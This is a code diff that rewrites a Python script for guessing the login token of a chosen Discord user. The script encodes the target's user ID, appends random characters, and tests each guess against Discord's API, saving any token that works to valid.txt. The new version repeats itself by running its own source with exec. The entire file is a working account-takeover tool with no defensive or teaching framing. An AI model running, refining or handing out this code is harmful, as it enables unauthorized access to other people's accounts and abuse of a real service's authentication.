@@ -2,41 +2,39 @@ import base64
 import random
 import requests
 
-def generate_token(user_id):
-    base64_user_id = base64.b64encode(user_id.encode('ascii')).decode('ascii')
-    rand_uppercase_letter = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
-    rand_chars = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=5))
-    rand_numbers = ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=27))
-    return f'{base64_user_id}.{rand_uppercase_letter}{rand_chars}.{rand_numbers}'
+# Check if id.txt exists and get the user ID from it if it does
+try:
+    with open("id.txt", "r") as f:
+        user_id = f.read().strip()
+except FileNotFoundError:
+    print('file not found')
+    user_id = input("Enter a Discord user ID: ")
 
-def check_token(token):
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': token
-    }
-    response = requests.get('https://discordapp.com/api/v6/users/@me/library', headers=headers)
-    if response.status_code == 200:
-        with open('valid.txt', 'a') as f:
-            f.write(token + '\n')
-        print('Valid token found, saved to valid.txt')
-        exit()
-    elif 'rate limited' in response.text:
-        print('Rate limited. Exiting.')
-        exit()
+# Encode the user ID in base64
+b64_user_id = base64.b64encode(user_id.encode()).decode()
+
+# Generate a random token
+token = f"{b64_user_id}.{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5))}.{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=27))}"
+
+# Send a request to the Discord API with the token as the authorization header
+headers = {"Content-Type": "application/json", "authorization": token}
+response = requests.get("https://discordapp.com/api/v6/users/@me/library", headers=headers)
+
+# Check the response status code
+if response.status_code == 200:
+    # If the status code is 200, the token is valid, so write it to valid.txt and exit
+    with open("valid.txt", "a") as f:
+        f.write(f"{token}\n")
+    print(f"Token {token} is valid.")
+else:
+    # If the status code is not 200, the token is invalid
+    if "rate limited" in response.text:
+        # If the response contains "rate limited", exit the program
+        print("API rate limit reached. Please try again later.")
     else:
-        print(f'Invalid token: {token}')
-        return False
-
-def main():
-    try:
-        with open('id.txt') as f:
-            user_id = f.read().strip()
-    except FileNotFoundError:
-        user_id = input('Enter Discord user ID: ').strip()
-    while True:
-        token = generate_token(user_id)
-        if check_token(token):
-            break
-
-if __name__ == '__main__':
-    main()
+        # If the response does not contain "rate limited", print the error message and repeat the token generation process
+        print(f"Token {token} is invalid.")
+        print(f"Error message: {response.text}")
+        print("Generating a new token...")
+        # Repeat the token generation process
+        exec(open(__file__).read())
